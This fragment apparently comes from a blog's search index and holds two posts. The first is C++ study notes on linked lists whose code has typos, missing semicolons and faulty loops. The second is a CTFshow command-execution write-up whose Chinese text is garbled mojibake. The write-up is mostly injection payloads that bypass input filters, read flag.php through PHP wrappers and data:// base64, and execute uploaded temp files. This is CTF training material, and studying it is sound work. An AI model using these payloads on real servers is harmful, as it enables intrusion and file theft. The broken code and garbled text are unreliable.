e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### çº¿æ€§è¡¨é“¾å¼ç»“æ„å®ç°\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//å•é“¾è¡¨å»ºç«‹æ–¹æ³•ï¼šå¤´æ’æ³•\n//1ã€å»ºç«‹ä¸€ä¸ªç©ºè¡¨ï¼Œé‡å¤è¯»å…¥æ•°æ®\n//2ã€ç”Ÿæˆæ–°èŠ‚ç‚¹ï¼Œå°†è¯»å…¥æ•°æ®å­˜æ”¾åˆ°æ–°èŠ‚ç‚¹çš„æ•°æ®åŸŸä¸­\n//3ã€ä»æœ€åä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹ï¼Œä¾æ¬¡å°†å„èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨çš„å‰ç«¯\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//å•é“¾è¡¨å»ºç«‹æ–¹æ³•ï¼šå¤´æ’æ³•\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//å°¾æŒ‡é’ˆ\nr=p\n    \n//å¾ªç¯é“¾è¡¨\n//å¥½å¤„ï¼šä»è¡¨ä¸­ä»»æ„é˜¶æ®µå‡ºå‘å‡å¯æ‰¾åˆ°è¡¨ä¸­å…¶ä»–èŠ‚ç‚¹\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//åŒå‘é“¾è¡¨\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//çº¿æ€§è¡¨åˆå¹¶\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//æœ‰åºè¡¨åˆå¹¶\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### æ ˆå’Œé˜Ÿåˆ—\n\n```C++\n//æ ˆåªèƒ½åœ¨è¡¨å°¾è¿›è¡Œæ’å…¥å’Œåˆ é™¤\n//é˜Ÿåˆ—åªèƒ½åœ¨è¡¨å°¾æ’å…¥ï¼Œè¡¨å¤´åˆ é™¤\n```\n\n","tags":["C++"]},{"title":"CTFshowå‘½ä»¤æ‰§è¡Œ","url":"/2022/02/07/CTFshowå‘½ä»¤æ‰§è¡Œ/","content":"\nå¯ç”¨äºæ‰§è¡Œphpå‡½æ•°çš„å‡½æ•°ï¼š\n\n```\neval()ã€assert()ã€preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//æ­£åˆ™è§„åˆ™ä¸­å«æœ‰/eä¿®é¥°ç¬¦å°±å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´\ncreate_function()\n```\n\nå¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š\n\n```php\nexec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npassthru()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ\nsystem()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ,è¿”å›å€¼ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œ å¤±è´¥åˆ™è¿”å› false\nshell_exec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\n`å‘½ä»¤`//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\nå¯ç”¨äºæ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦ï¼š\n\n```\n%09ã€$IFS$9ã€ ${IFS}ã€$IFS%09ã€< ã€<>ã€%20ç­‰\n```\n\nå¯ç”¨äºè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼š\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\n```\n\né€šé…ç¬¦ï¼š\n\n```\n*ä»£è¡¨ä»»æ„ä½\n?ä»£è¡¨ä¸€ä½\n```\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ï¼Œf*ä»£è¡¨åŒ¹é…æ‰€æœ‰ä»¥få¼€å¤´çš„æ–‡ä»¶ï¼Œ\\`å†…éƒ¨ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œé€šè¿‡echoå¾—åˆ°è¿”å›å€¼\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,phpï¼ŒåŒä¸Š\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼ï¼Œä½¿ç”¨%09å°†ç©ºæ ¼æ›¿ä»£å³å¯\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å‡½æ•°`include()`ï¼Œincludeå¯ä»¥å®ç°æ— æ‹¬å·åŒ…å«ï¼Œè¿›è€Œé€šè¿‡`?>`å°†æ•´ä¸ªPHPä»£ç é—­åˆå³å¯ç»•è¿‡åˆ†å·ï¼Œè€Œåå°±èƒ½åšåˆ°å‚æ•°é€ƒé€¸ï¼ˆå› ä¸ºä»£ç ä¸­åªæ£€æµ‹äº†cä¸­ä¼ å…¥çš„å†…å®¹ï¼‰ï¼Œè¿›è€Œé€šè¿‡ä¼ å…¥å‚æ•°é€šè¿‡phpä¼ªåè®®è¯»å–å†…å®¹\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·ï¼ŒåŒä¸Š\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·ï¼ŒåŒä¸Š\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·ï¼ŒåŒä¸Š\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·,æ•°å­—ï¼Œå°†getå‚æ•°ä¸­çš„æ•°å­—æ”¹ä¸ºå­—æ¯å³å¯\n\n##### 37\n\n```\npayload:?c=php://input\nè¯·æ±‚ä½“:<?php include \"flag.php\"?>\næˆ–\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\nincludeå‡½æ•°å¼€å§‹ï¼Œè¿‡æ»¤äº†flagï¼Œé€šè¿‡php://inputä¼ªåè®®ç›´æ¥åŒ…å«æ–‡ä»¶\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\nè¿‡æ»¤äº†flag, php,fileï¼Œé€šè¿‡dataä¼ªåè®®æ‰§è¡Œinclude \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\nè¿‡æ»¤äº†flagå¹¶ä¸”åŒ…å«çš„æ˜¯å˜é‡c.phpï¼Œè¾“å…¥åç›¸å½“äºç›´æ¥æ‰§è¡Œè¾“å…¥çš„PHPå‘½ä»¤ï¼Œç”±äºå‰é¢çš„PHPå†…å®¹å·²ç»é—­åˆï¼Œæ‰€ä»¥åé¢çš„.phpç›´æ¥å°±æ˜¯.phpæ–‡æœ¬æ˜¾ç¤ºï¼Œå¯¹å‰é¢çš„å‘½ä»¤è¾“å…¥æ²¡æœ‰å½±å“\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());å¯ä»¥æ‹¿åˆ°æ‰€æœ‰å·²ç»å®šä¹‰çš„å˜é‡å¹¶å–å¾—å€¼\n\nnext(å˜é‡)å¯ä»¥è·å¾—ä¸‹ä¸€ä¸ªå˜é‡\n\narray_pop(æ•°ç»„)å¼¹å‡ºæ•°ç»„ä¸­çš„å˜é‡ä¸ºå•ä¸ªç‹¬ç«‹å˜é‡\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\næœ¬åœ°ä¿®æ”¹sessionIDä¼ å…¥å‘½ä»¤\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\nå¯ä»¥å‘ç°å¤§å¤šæ•°è‡ªè´Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒæŸ¥çœ‹æç¤º\n\né€šè¿‡è„šæœ¬å¯è·å–å¼‚æˆ–ï¼ˆï½œï¼‰åèƒ½å¾—åˆ°çš„æ‰€æœ‰å­—ç¬¦\n\nç›´æ¥ä½¿ç”¨è„šæœ¬\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\né¢˜ç›®ä¸­å°†å‘½ä»¤è¾“å‡ºä¿å­˜åˆ°é»‘æ´ä¸­ï¼Œå¯é€šè¿‡åˆ†å·åˆ†å‰²å‘½ä»¤è®©ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤ç›´æ¥æ˜¾ç¤º\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†catå’Œåˆ†å·ï¼Œé€šè¿‡&&ä¹Ÿå¯è¿›è¡Œå¤šå‘½ä»¤æ‰§è¡Œï¼Œè¦è¿›è¡ŒURLç¼–ç \n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰¾ä¸ªèƒ½æ›¿ä»£çš„å°±è¡Œ\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†*å’Œ$ï¼Œä½¿ç”¨%09ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰æ›¿ä»£ç©ºæ ¼\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ä¸€äº›è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†æ²¡æ»¤tacï¼Œç›´æ¥ç”¨\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ•°å­—å’Œç©ºæ ¼\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ°´å¹³åˆ¶è¡¨ç¬¦å’Œ&&ç¬¦ï¼Œå°†&æ›´æ¢ä¸ºï½œä¹Ÿå¯ä»¥å¤šå‘½ä»¤æ‰§è¡Œ\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\næ»¤äº†tacå‘œå‘œå‘œå‘œç”¨nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\næ»¤æ‰äº†å°–æ‹¬å·ä½†æ˜¯$å›æ¥äº†\n\n`nl${IFS}fla%27%27g.php||`\n\nä½†æ˜¯æ˜æ˜¾flagä¸å¯¹ï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•`ls${IFS}/`å‘ç°flagå­˜åœ¨\n\nä½¿ç”¨nlè¯»å–\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\nè¯¥é¢˜å†…å®¹ä¸åŒ\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\nå…ˆå°†å‘½ä»¤æ‰“å°å¹¶æ‰§è¡Œåè·å¾—systemå‡½æ•°çš„è¿”å›å€¼å¹¶è¾“å‡ºï¼Œsystemå‡½æ•°åªè¿”å›å‘½ä»¤æ‰§è¡Œåè¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œä½¿ç”¨tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\nè¿‡æ»¤äº†å•å¼•å·ç»•è¿‡ï¼Œé€šè¿‡mvå‘½ä»¤é‡å‘½åç›´æ¥è¯»å–\n\n##### 55\n\nè¿‡æ»¤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ**\n\nç›´æ¥è®²åŸç†å’¯\n\n.ï¼ˆç‚¹ï¼‰æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™â€œ.fileâ€çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç”¨â€œ.fileâ€æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨â€œ.â€æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ\n\nå’‹æ‰§è¡Œå‘¢ï¼ŒåŸç†æ˜¯å½“æˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«å‚¨å­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶æ˜¯`/tmp/phpXXXXXX`(å…­ä¸ªéšæœºå­—ç¬¦)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨é€šé…ç¬¦ï¼ˆ?å•åŒ¹é…å’Œ*å¤šåŒ¹é…ï¼‰æ¥å°è¯•æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†æ˜¯å°è¯•æ‰§è¡Œåå‘ç°ä¸è¡Œï¼Œæˆ‘ä»¬è‡ªå·±æ­å»ºä¸€ä¸ªphpç¯å¢ƒçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\nåˆ—å‡ºç›¸å…³çš„æ–‡ä»¶åå‘ç°æ˜¯å› ä¸ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„æ–‡ä»¶æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼Œå°±å¯¼è‡´è¿˜æ²¡è¿è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬æ—¶å°±å·²ç»ç»“æŸäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•ç”¨å…¶ä»–çš„é€šé…ç¬¦åŒ¹é…å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™ï¼ŒLinuxçš„globé€šé…ç¬¦çš„ç›¸å…³å†…å®¹ï¼ˆè´´ä¸ªé“¾æ¥ï¼‰\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\né™¤äº†ä½¿ç”¨?å’Œ*è¿›è¡Œä»»æ„åŒ¹é…ï¼Œè¿˜å¯ä»¥ä½¿ç”¨`[^X]`æ¥æ’é™¤æŸä¸ªå­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ’é™¤å‰é¢åŒ…å«`-`å’Œ`.`æ–‡ä»¶ï¼Œç»§ç»­æŸ¥çœ‹å‘ç°è¿˜å‰©ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼Œè€Œåå‘ç°è¿˜æœ‰ä¸€ä¸ªé€šé…ç¬¦è¯­æ³•`[X-Y]`å¯ä»¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œè€Œä¸”åªæœ‰phpä¸´æ—¶æ–‡ä»¶ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ŒæŸ¥è¯¢asciiç è¡¨å‘ç°å¤§å†™å­—æ¯ä½äº`@`å’Œ`[`ä¹‹é—´ï¼Œæ‰€ä»¥æ„é€ `[@-[]`å°±å¯ä»¥åŒ¹é…åˆ°æˆ‘ä»¬çš„æ–‡ä»¶äº†\n\næœ€ç»ˆpayload\n\né¦–å…ˆæ„å»ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ•°æ®åŒ…POC</title>\n</head>\n<body>\n<form action=\"å½“å‰é“¾æ¥/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">æ–‡ä»¶åï¼š</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n</form>\n</body>\n</html>\n```\n\nç¬¬ä¸€ä¸ªæ–‡ä»¶å†…å®¹\n\n```shell\nls\nç„¶å\ncat /var/www/html/flag.php\n```\n\nå¦‚æœä¸€æ¬¡ä¸æˆåŠŸå°±repeaterå¤šè¯•å‡ æ¬¡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\næ‹¿åˆ°flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\nè¿‡æ»¤äº†å¤§é‡å­—ç¬¦ï¼Œæœ€ç»ˆéœ€è¦æ„å»º36å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤`$`ï¼Œè€Œåœ¨Linuxä¸­$æ˜¯å˜é‡çš„å…³é”®å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡\n\n```\n$(())è¿™ä¸ªå˜é‡ä¸­çš„()ä»£è¡¨æ•°å­¦è¿ç®—ï¼Œç»“æœä¸º0ï¼Œæ‰€ä»¥\necho $(())\n0\nå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œå–åæ“ä½œç»“æœä¸º\necho ~$(())\n~0\né‚£ä¹ˆæˆ‘ä»¬å†å¯¹~0è¿›è¡Œæ•°å­¦è¿ç®—å¾—åˆ°çš„ç»“æœå°±æ˜¯\necho $((~$(())))\n~1\næ‰€ä»¥æˆ‘ä»¬æƒ³å¾—åˆ°36å°±æ˜¯è®©36ä¸ª~1ç›¸åŠ å†å–å\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\nå‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°\n\né¦–å…ˆå°è¯•systemå‘ç°è¢«è¿‡æ»¤äº†ï¼Œemmmmå°è¯•è¿‡åå‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å…¨è¢«ç¦ç”¨äº†\n\né‚£ä¹ˆå°è¯•èƒ½å¦è¯»å–æ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentsè¯»å–æˆåŠŸï¼Œæç¤ºä¸­ä¹Ÿæ˜¾ç¤ºshow_sourceåŒæ ·å¯ç”¨\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\nèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°±åˆ«è¯•äº†ï¼Œå…¨æŒ‚äº†\n\nshow_sourceå¯ç”¨\n\nè¿˜å¯å°è¯•é€šè¿‡includeæ¥åŒ…å«æ–‡ä»¶ï¼Œå†é€šè¿‡PHPä¼ªåè®®è¿›è¡Œè¯»å–\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\nä¸Šä¸€é¢˜å¯ç”¨çš„æ–¹æ³•ä¹Ÿå¯\n\n##### 61\n\nåŒä¸Š\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\nä¸Šé¢æ‰€æœ‰æ–¹æ³•çš†å¯\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`å¯è·å¾—æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡ï¼Œå½“ä¸çŸ¥é“å˜é‡åæ—¶å¯ä½¿ç”¨è¿™ä¸ª\n\nä¸Šé¢æ–¹æ³•åŒæ ·ğŸ‰‘ï¸\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`å¯ç”¨äºæ‰«ææ–‡ä»¶ï¼Œå’Œlsä¸€ä¸ªæ„æ€ï¼Œå½“æˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶åæ—¶å¯ä½¿ç”¨\n\n##### 65\n\nåŒä¸Š\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 17.49.25.png)\n\nå°è¯•å¤±è´¥è¿˜è¢«å˜²è®½äº†ï¼Œé¦–å…ˆæ‰«æä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag.txtï¼Œ`highlight_file('/flag.txt')`è¯»å–å³å¯\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\nåŒä¸Š\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\nå±äºæ˜¯ç¦»è°±äº†ï¼Œç›´æ¥å°äº†`highlight_file`å‡½æ•°ï¼Œ`var_dump(scandir('/'))`ï¼Œå‘ç°åœ¨æ ¹ç›®å½•ä¸­ï¼Œç›´æ¥includeæ–‡ä»¶ï¼Œæ²¡æœ‰phpæ ‡ç­¾å³ä¸ºç›´æ¥æ˜¾ç¤ºæºç ï¼Œç­‰äºç›´æ¥æ˜¾ç¤ºflag.txtçš„å†…å®¹\n\n##### 69\n\nåŒä¸Š\n\n##### 70\n\nç»§ç»­ç™½å«–\n\n##### 